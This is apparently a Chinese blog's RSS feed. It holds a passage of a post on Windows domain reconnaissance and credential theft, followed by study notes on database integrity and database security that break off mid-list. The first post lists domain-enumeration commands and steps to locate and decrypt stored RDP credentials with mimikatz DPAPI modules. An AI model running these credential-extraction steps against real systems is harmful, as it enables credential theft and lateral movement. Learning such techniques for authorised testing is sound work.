&lt;h4 id=&#34;判断是否存在域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断是否存在域&#34;&gt;#&lt;/a&gt; 判断是否存在域&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;ipconfig /all
systeminfo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;二者都可，前者目光聚焦于 DNS，后者信息很明显&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223203436386.png&#34; alt=&#34;image-20221223203436386&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223203404441.png&#34; alt=&#34;image-20221223203404441&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看域内上的组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看域内上的组&#34;&gt;#&lt;/a&gt; 查看域内上的组&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;net group /domain
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223203948352.png&#34; alt=&#34;image-20221223203948352&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看组上的详细成员&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看组上的详细成员&#34;&gt;#&lt;/a&gt; 查看组上的详细成员&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;net group &amp;quot;domain adminis&amp;quot; /domain
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223204207707.png&#34; alt=&#34;image-20221223204207707&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;找域控&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#找域控&#34;&gt;#&lt;/a&gt; 找域控&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;nltest /DCLIST:liuqi
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223204720630.png&#34; alt=&#34;image-20221223204720630&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用这个工具可以找密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223204806995.png&#34; alt=&#34;image-20221223204806995&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看远程桌面的凭证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看远程桌面的凭证&#34;&gt;#&lt;/a&gt; 查看远程桌面的凭证&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;cmdkey list
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223205107289.png&#34; alt=&#34;image-20221223205107289&#34; /&gt;&lt;/p&gt;
&lt;p&gt;我这里没有，登录一下，为后续继续实验铺垫&lt;/p&gt;
&lt;h4 id=&#34;查看凭证文件的位置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看凭证文件的位置&#34;&gt;#&lt;/a&gt; 查看凭证文件的位置&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;dir /a %userprofile%\appdata\local\microsoft\credentials\*
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223205359052.png&#34; alt=&#34;image-20221223205359052&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;破解凭证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#破解凭证&#34;&gt;#&lt;/a&gt; 破解凭证&lt;/h4&gt;
&lt;h5 id=&#34;获取guid&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取guid&#34;&gt;#&lt;/a&gt; 获取 guid&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;mimikatz dpapi::cred /in:凭证路径
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223205642671.png&#34; alt=&#34;image-20221223205642671&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;找到guid对应的key&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#找到guid对应的key&#34;&gt;#&lt;/a&gt; 找到 guid 对应的 key&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;mimikatz sekurlsa::dpapi
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223205835271.png&#34; alt=&#34;image-20221223205835271&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;解密凭证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解密凭证&#34;&gt;#&lt;/a&gt; 解密凭证&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;mimikatz dpapi::cred /in:凭证的文件路径 /masterkey:masterkey的值
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223210136351.png&#34; alt=&#34;image-20221223210136351&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2022/12/09/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%8C%E6%95%B4%E6%80%A7/</guid>
            <title>数据库的完整性</title>
            <link>https://blog.xcu.icu/2022/12/09/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%8C%E6%95%B4%E6%80%A7/</link>
            <category term="数据库" scheme="https://blog.xcu.icu/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
            <category term="数据库" scheme="https://blog.xcu.icu/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
            <pubDate>Fri, 09 Dec 2022 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;以此篇记录数据库系统概述的第五章，数据库完整性的学习&lt;/p&gt;
&lt;p&gt;数据库的完整性是指数据的 &lt;code&gt;正确性&lt;/code&gt; 和 &lt;code&gt;相容性&lt;/code&gt; ，为了维护数据库的完整性，数据库管理系统需要实现如下功能&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;提供定义完整性约束条件的机制&lt;/li&gt;
&lt;li&gt;提供完整性检查的方法&lt;/li&gt;
&lt;li&gt;进行违约处理&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;实体完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实体完整性&#34;&gt;#&lt;/a&gt; 实体完整性&lt;/h2&gt;
&lt;h3 id=&#34;实体完整性定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实体完整性定义&#34;&gt;#&lt;/a&gt; 实体完整性定义&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;关系模型的实体完整性
&lt;ul&gt;
&lt;li&gt;create table 中用 PRIMARY KEY 定义&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;单属性构成的码有两种说明方法
&lt;ul&gt;
&lt;li&gt;定义为列级约束条件&lt;/li&gt;
&lt;li&gt;定义为表级约束条件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对多个属性构成的码只有一种说明方法
&lt;ul&gt;
&lt;li&gt;定义为表级约束条件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;将Student表中的Sno属性定义为码&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;create table Student (
    Sno char(9) PRIMARY KEY,
    Sname char(20) NOT NULL,
    Ssex char(2),
    Sage smallint,
    Sdept char(20)
); 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;将SC表中的Sno、Cno属性组定义为码&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;create table SC (
    Sno char(9) NOT null,
    Cno char(4) not null,
    Grade smallint,
    primary key (Sno,Cno)
);
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;实体完整性检查和违约处理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实体完整性检查和违约处理&#34;&gt;#&lt;/a&gt; 实体完整性检查和违约处理&lt;/h3&gt;
&lt;p&gt;插入或对主码进行更行操作时，RDBMS 按照实体完整性规则进行检查（通过 &lt;code&gt;全表扫描&lt;/code&gt; 的方式进行）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;检查主码是否唯一&lt;/li&gt;
&lt;li&gt;检查主码的各个属性是否为空&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;参照完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参照完整性&#34;&gt;#&lt;/a&gt; 参照完整性&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在 create table 中用 foreign key 短语定义哪些列为外码&lt;/li&gt;
&lt;li&gt;用 references 短语指明这些外码参照哪些表的主码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参照完整性的违约处理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;拒绝执行（默认）&lt;/li&gt;
&lt;li&gt;级联操作&lt;/li&gt;
&lt;li&gt;设置为空值&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;用户自定义完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户自定义完整性&#34;&gt;#&lt;/a&gt; 用户自定义完整性&lt;/h2&gt;
&lt;p&gt;用户定义的完整性是针对某一个具体应用的数据必须满足的语义要去，由 RDBMS 提供，而不必由应用程序承担&lt;/p&gt;
&lt;h3 id=&#34;属性上的约束条件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#属性上的约束条件&#34;&gt;#&lt;/a&gt; 属性上的约束条件&lt;/h3&gt;
&lt;p&gt;CREATE TABLE 语句中：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;列值非空（NOT NULL）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;列值唯一（unique）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;创建部门表DEPT，要去部门名称Dname列取唯一值，部门编号Deptno列为主码&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;create table DEPT (
    Deptno char(10) primary key,
    Dname char(10) unique
);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查列值是否满足一个布尔表达式（CHAECK）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;用check短语指定列值应该满足的条件，Student表的Ssex只允许取男或女&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;create table Student(
    Sno char(20) primary key,
    Sname char(10) not null,
    Ssex cahr(2) check(Ssex IN(&#39;男&#39;,&#39;女&#39;))，
    Sage smallint，
    Sdept cahr(2)
);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;注：属性上的约束条件检查和违约处理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;插入元组或者修改属性时，RDBMS 检查属性上的约束条件是否被满足，如果不满足则被拒绝执行&lt;/p&gt;
&lt;h3 id=&#34;元组上的约束条件的定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#元组上的约束条件的定义&#34;&gt;#&lt;/a&gt; 元组上的约束条件的定义&lt;/h3&gt;
&lt;p&gt;与同属性值限制相比，元组级的限制可以设置 &lt;code&gt;不同属性&lt;/code&gt; 之间的取值的相互约束条件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;当学生的性别是男的时候，其名字不能以Ms. 开头&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;create table Student (
    Sname char(9) NOT null,
    Sno char(10),
    Ssex char(2),
    primary key(Sno),
    check(Ssex=&#39;女&#39; or not like &#39;Ms.&#39;)
);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改需要使用 ALTER TABLE 语句修改表中的完整性限制，修改时需要先删除原来的约束条件，再增加新的约束条件&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2022/12/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7/</guid>
            <title>数据库安全性</title>
            <link>https://blog.xcu.icu/2022/12/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7/</link>
            <category term="数据库" scheme="https://blog.xcu.icu/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
            <category term="数据库" scheme="https://blog.xcu.icu/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
            <pubDate>Tue, 06 Dec 2022 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;本篇记录学习数据库系统概论的第四章 -- 数据库安全性&lt;/p&gt;
&lt;h2 id=&#34;数据库安全性概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库安全性概述&#34;&gt;#&lt;/a&gt; 数据库安全性概述&lt;/h2&gt;
&lt;p&gt;数据库的安全性是指保护数据库中的数据，以防止不合法的使用导致数据库中数据的泄露，更改和破坏&lt;/p&gt;
&lt;h3 id=&#34;数据库的不安全因素&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库的不安全因素&#34;&gt;#&lt;/a&gt; 数据库的不安全因素&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;非授权用户对数据库的恶意存取和破坏&lt;/li&gt;
&lt;li&gt;数据库中安全或敏感的数据被泄露&lt;/li&gt;
&lt;li&gt;安全环境的脆弱性&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;安全标准&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全标准&#34;&gt;#&lt;/a&gt; 安全标准&lt;/h3&gt;
&lt;p&gt;桔皮书（TCSEC）和 CC 标准，是最具有影响力的两大准则，当下 CC 已经基本取代了 TCSEC 成为评估信息产品安全性的主要标准&lt;/p&gt;
&lt;h4 id=&#34;tcsec标准&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tcsec标准&#34;&gt;#&lt;/a&gt; TCSEC 标准&lt;/h4&gt;
&lt;p&gt;从四个方面来描述安全性级别划分的指标，即 &lt;code&gt;安全策略&lt;/code&gt; ， &lt;code&gt;责任&lt;/code&gt; ， &lt;code&gt;保证&lt;/code&gt; 和 &lt;code&gt;文档&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;下图是发展史&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206141149070.png&#34; alt=&#34;image-20221206141149070&#34; /&gt;&lt;/p&gt;
&lt;p&gt;从这四个方面又划分出如下 7 个等级&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206141110402.png&#34; alt=&#34;image-20221206141110402&#34; /&gt;&lt;/p&gt;
&lt;p&gt;安全级别从上往下越来越低，D 级包含了所有不符合更高标准的系统&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;C1，能够实现用户和数据的分离，进行自主存取控制（DAC）&lt;/li&gt;
&lt;li&gt;C2，安全产品的最低档，提供受控的存取保护&lt;/li&gt;
&lt;li&gt;B1，对标记的主体和课题实施强制存取控制（MAC）以及审计等安全机制，被认为是真正意义上的安全产品&lt;/li&gt;
&lt;li&gt;B2 结构化保护&lt;/li&gt;
&lt;li&gt;B3，安全域&lt;/li&gt;
&lt;li&gt;A1，验证设计&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;cc标准&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cc标准&#34;&gt;#&lt;/a&gt; CC 标准&lt;/h4&gt;
&lt;p&gt;国际公认的表述信息技术安全性的结构，主要由三个部分组成&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;简介和一般模型&lt;/li&gt;
&lt;li&gt;安全功能要求&lt;/li&gt;
&lt;li&gt;安全保证要求&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;他的安全级别也是划分为 7 个等级分别对应 TCSEC 安全级别&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206143134148.png&#34; alt=&#34;image-20221206143134148&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;数据库安全性控制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库安全性控制&#34;&gt;#&lt;/a&gt; 数据库安全性控制&lt;/h2&gt;
&lt;p&gt;上面所记录仅做了解，接下来是本篇的重心部分&lt;/p&gt;
&lt;p&gt;&lt;code&gt;再计算机系统中，安全措施是一级一级层层设置的&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206165609085.png&#34; alt=&#34;image-20221206165609085&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这样如上图的一个验证过程&lt;/p&gt;
&lt;p&gt;数据库安全控制的常用方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户身份鉴定&lt;/li&gt;
&lt;li&gt;存取控制&lt;/li&gt;
&lt;li&gt;视图&lt;/li&gt;
&lt;li&gt;审计&lt;/li&gt;
&lt;li&gt;数据加密&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;用户的身份鉴定&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户的身份鉴定&#34;&gt;#&lt;/a&gt; 用户的身份鉴定&lt;/h3&gt;
&lt;p&gt;用户标识通常由用户名和用户标识号两部分组成&lt;/p&gt;
&lt;p&gt;常用的身份鉴别方法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;静态口令鉴别：常用，简单但是安全性低&lt;/li&gt;
&lt;li&gt;动态口令鉴别：比较安全&lt;/li&gt;
&lt;li&gt;生物特征鉴别：较高的安全性&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;存取控制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#存取控制&#34;&gt;#&lt;/a&gt; 存取控制&lt;/h3&gt;
&lt;p&gt;数据库安全性最重要的一点就是确保只有授权的用户能访问数据库&lt;/p&gt;
&lt;p&gt;&lt;code&gt;存取控制的机制&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户定义权限&lt;/li&gt;
&lt;li&gt;合法权限检查&lt;/li&gt;
&lt;li&gt;二者共同组成了 DBMS 的存取控制子系统&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;自主存取控制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自主存取控制&#34;&gt;#&lt;/a&gt; 自主存取控制&lt;/h3&gt;
&lt;p&gt;通过 SQL 语言的 &lt;code&gt;GRANT&lt;/code&gt; （授予）和 &lt;code&gt;REVOKE&lt;/code&gt; （收回）语句实现，用户的权限组成：数据库对象，操作类型&lt;/p&gt;
&lt;p&gt;定于用权限，定于用户可以在哪些表上面可以进行哪些操作，下表是关系数据库中的存储权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206174324541.png&#34; alt=&#34;image-20221206174324541&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;授权和权限回收&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#授权和权限回收&#34;&gt;#&lt;/a&gt; 授权和权限回收&lt;/h3&gt;
&lt;h4 id=&#34;授权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#授权&#34;&gt;#&lt;/a&gt; 授权&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;GRANT &amp;lt;权限&amp;gt;[,&amp;lt;权限&amp;gt;]... ON &amp;lt;对象类型&amp;gt; &amp;lt;对象名&amp;gt;[,&amp;lt;对象类型&amp;gt;&amp;lt;对象名&amp;gt;]... TO &amp;lt;用户&amp;gt;[,&amp;lt;用户&amp;gt;]... [WITH GRANT OPTION];/*又最后一句话的时候证明权限是可以授予给他人的*/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;把查询Student的权限授予给用户U1&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant select ON Student to U1;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;把对Student和Course的全部权限授予U2，U3&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant All privileges ON Student,Course to U2,U3;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;把对SC表的查询权限授予所有用户&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant select on SC to public;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;把查询Student表和修改Sno的权限授予U4&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant select,update(Sno) on Student to U4;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;对SC表的INSERT权限授予U5，且可再次授权&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant insert on SC to U5 with grant option;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;权限收回&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限收回&#34;&gt;#&lt;/a&gt; 权限收回&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;REVOKE &amp;lt;权限&amp;gt;[,&amp;lt;权限&amp;gt;]... ON &amp;lt;对象类型&amp;gt;&amp;lt;对象名&amp;gt;[,&amp;lt;对象类型&amp;gt;&amp;lt;对象名&amp;gt;]... FROM &amp;lt;用户&amp;gt;[,&amp;lt;用户&amp;gt;]...;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;把用户U4修改学号的权限收回&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;revoke update(Sno) ON Student from U4;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;收回所有用户对表SC的查询权限&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;revoke select ON SC from public;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;把用户U5对SC表的Insert权限收回&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;revoke insert on SC from U5 cascade;#cascade级联操作，收回U5授予出去的权限
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;lt;font color=red&amp;gt; 用户可以自主决定将数据的存取权限授予任何人，决定是否也将授权的权限搜娱给别人，这样的存取控制称为用户自主存取控制 &amp;lt;/font&amp;gt;&lt;/p&gt;
&lt;h3 id=&#34;数据库角色&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库角色&#34;&gt;#&lt;/a&gt; 数据库角色&lt;/h3&gt;
&lt;p&gt;数据库角色是数据库权限的集合，为了简化授权过程，为一组具有相同权限的用户创建一个角色&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;角色的创建&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;CREATE ROLE &amp;lt;角色名&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;给角色授权&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;GRANT &amp;lt;权限&amp;gt;[,&amp;lt;权限&amp;gt;]... ON 对象名 TO &amp;lt;角色&amp;gt;[,&amp;lt;角色&amp;gt;]...;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将一个角色授予其他的角色或用户&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;GRANT &amp;lt;角色1&amp;gt;[,&amp;lt;角色2&amp;gt;]... TO &amp;lt;角色2&amp;gt;[,&amp;lt;用户1&amp;gt;]... [WITH ADMIN OPTION];
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;角色权限的收回&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;REVOKE &amp;lt;权限&amp;gt;[,&amp;lt;权限&amp;gt;]... ON &amp;lt;对象类型&amp;gt;&amp;lt;对象名&amp;gt; FROM &amp;lt;角色&amp;gt;[,&amp;lt;角色&amp;gt;]...;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;通过角色来实现将一组权限搜娱一个用户&lt;/code&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;首先创建一个角色 R1&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;create role R1;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后使用 FRANT 语句，使角色 R1 拥有 Student 表的 SELECT，UPDATE，INSERT 权限&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant select,update,insert on Student to R1;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将这个角色权限授予王平，张明，赵玲，使他们具有角色 R1 所包含的全部权限&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant R1 to 王平,张明,赵玲;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过 R1 一次性收回王平的这三个权限&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;revoke R1 from 王平;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;强取存取控制的方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#强取存取控制的方法&#34;&gt;#&lt;/a&gt; 强取存取控制的方法&lt;/h3&gt;
&lt;p&gt;自主存取控制缺点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可能存在数据的 “无意泄露”&lt;/li&gt;
&lt;li&gt;这种机制仅仅通过对数据的存取权限来进行安全控制，而数据本身并无安全性标记&lt;/li&gt;
&lt;li&gt;解决：对系统控制下的所有主客体实施存取控制策略&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;强制存取控制（MAC）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保证更高的安全性&lt;/li&gt;
&lt;li&gt;用户不能直接感知或进行控制&lt;/li&gt;
&lt;li&gt;适用于对数据有严格而固定密级分类的部门
&lt;ul&gt;
&lt;li&gt;军事、政府部门&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主体是系统中的活动实体&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DBMS 所管理的实际用户&lt;/li&gt;
&lt;li&gt;代表用户的各进程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;客体是系统中的被动实体，是受主体操纵的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件&lt;/li&gt;
&lt;li&gt;基表&lt;/li&gt;
&lt;li&gt;索引&lt;/li&gt;
&lt;li&gt;视图&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;敏感读标记（Label）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;绝密（Top Secret）&lt;/li&gt;
&lt;li&gt;机密（Secret）&lt;/li&gt;
&lt;li&gt;可信（Confidential）&lt;/li&gt;
&lt;li&gt;公开（public）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主体的敏感度标记称为许可证级别（Clearabce Level）&lt;/p&gt;
&lt;p&gt;客体的敏感度标记称为密级（Claccification Level）&lt;/p&gt;
&lt;p&gt;强制存取控制规则&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;仅当主体的许可证级别大于或等于客体的密级时，该主体才能读取相应的客体&lt;/li&gt;
&lt;li&gt;仅当主体的许可证级别小于或等于客体的密级时，该主体才能写相应的客体&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;审计&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#审计&#34;&gt;#&lt;/a&gt; 审计&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;审计日志&lt;/p&gt;
